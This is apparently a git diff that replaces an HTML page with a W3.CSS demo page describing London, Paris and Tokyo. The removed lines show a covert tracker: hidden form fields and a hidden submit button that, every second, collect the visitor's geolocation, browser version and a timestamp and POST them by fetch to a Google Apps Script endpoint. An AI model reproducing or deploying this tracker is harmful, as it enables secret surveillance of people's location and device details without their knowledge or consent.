@@ -1,98 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>W3.CSS</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+</head>
+<body>
 
+<div class="w3-container w3-green">
+  <h1>W3Schools Demo</h1> 
+  <p>Resize this responsive page!</p> 
+</div>
 
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+<div class="w3-row-padding">
+  <div class="w3-third">
+    <h2>London</h2>
+    <p>London is the capital city of England.</p>
+    <p>It is the most populous city in the United Kingdom,
+    with a metropolitan area of over 13 million inhabitants.</p>
+  </div>
 
-       <form method="post" autocomplete="off" name="live_location">
+  <div class="w3-third">
+    <h2>Paris</h2>
+    <p>Paris is the capital of France.</p> 
+    <p>The Paris area is one of the largest population centers in Europe,
+    with more than 12 million inhabitants.</p>
+  </div>
 
- 
-  <input class="input-field" id="uname" type="text" placeholder="Full Name" name="NAME" maxlength="23" id="fullname" value="Sachin"  required >
- 
+  <div class="w3-third">
+    <h2>Tokyo</h2>
+    <p>Tokyo is the capital of Japan.</p>
+    <p>It is the center of the Greater Tokyo Area,
+    and the most populous metropolitan area in the world.</p>
+  </div>
+</div>
 
-    <input type="text" id="lat" name="LATITUDE">
-    <input type="text" id="long" name="LONGITUDE">
-
- 
-
-
-  <br />   <br />
-<textarea class="no_dp" id="udata" name="DEVICE_INFO"></textarea> <br />
-<textarea class="no_dp" id="start_time" name="TIMESTAMP"></textarea>   <br />
-
-<script>
-function timestamp() {
-var start_dt = new Date();
-
-document. getElementById("start_time").innerHTML = (("0"+start_dt.getDate()).slice(-2)) +"/"+ (("0"+(start_dt.getMonth()+1)).slice(-2)) +"/"+ (start_dt.getFullYear()) +"  "+ (("0"+start_dt.getHours()).slice(-2)) +":"+ (("0"+start_dt.getMinutes()).slice(-2)) +":"+ (("0"+start_dt.getSeconds()).slice(-2));
-
-document.getElementById ("udata").innerHTML = navigator.appVersion; 
-
-}</script>      
-
-
-
-
-
-
-<p id="demo"></p>
-
-<script>
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else { 
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
-}
-
-function showPosition(position) {
-   document.getElementById("lat").value = position.coords.latitude;
-   document.getElementById("long").value = position.coords.longitude;
-}
-</script>
-
-
-
-
-
-
-
-<script type="text/javascript" src="https://code.jquery.com/jquery-1.7.2.min.js"></script> 
-           
-
- 
-
-
-    <input type="submit" name="submit" id="submit" class="no_dp" />
-
-  </form>
-
-  <script>
-
-function loadData() {
-  timestamp(),
-  getLocation(),
-  document.getElementById("submit").click()
-
-}
-
-setInterval(loadData, 1000);
-
-
-            const scriptURL =  '1https://script.google.com/macros/s/AKfycbyOoCqRODlOzz_tzBFwMIFjXRFjK2_gMVyG6s_NEpDfwNZkBik/exec' 
-            const form = document.forms['live_location'] 
-          
-            form.addEventListener('submit', e => {
-              e.preventDefault()
-              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-            })
-    
- 
-</script>
-
-
-
-
-<br /> <br /> 
-
-
+</body>
+</html>
 
